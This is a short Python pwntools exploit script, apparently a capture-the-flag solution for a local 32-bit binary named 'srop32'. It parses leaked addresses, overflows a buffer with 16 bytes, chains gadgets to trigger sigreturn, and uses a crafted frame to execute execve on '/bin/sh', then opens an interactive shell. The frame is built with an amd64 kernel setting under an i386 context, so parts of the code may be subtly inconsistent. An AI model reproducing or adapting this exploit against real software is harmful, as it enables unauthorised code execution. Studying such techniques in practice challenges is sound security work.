from pwn import *


def leak(p):
    p.recvuntil("func: 0x")
    func = int(p.recvline(), 16)

    p.recvuntil("/bin/sh: 0x")
    binsh = int(p.recvline(), 16)

    log.info("Func 0x%x. /bin/sh 0x%x" % (func, binsh))

    return func, binsh

def main():
    context.arch = 'i386'
    p = process("./srop32")
    
    func, binsh = leak(p)
    
    moveax = func + 13
    int0x80 = func + 19

    frame = SigreturnFrame(kernel='amd64') # Construct our Sig Return Frame
    frame.eax = constants.SYS_execve       # Syscall to call
    frame.ebx = binsh                      # First argument to execve 
    frame.eip = int0x80                    # Return here after the syscall

    
    payload = 'A' * 16                     # Overflow the buffer
    payload += p32(moveax)                 # Mov 0x77 into eax (SYS_sigreturn)
    payload += p32(int0x80)                # Evoke the syscall 
    payload += str(frame)                  # Add our sigreturn frame to the end
    p.sendline(payload)


    p.interactive()

if __name__ == "__main__":
    main()
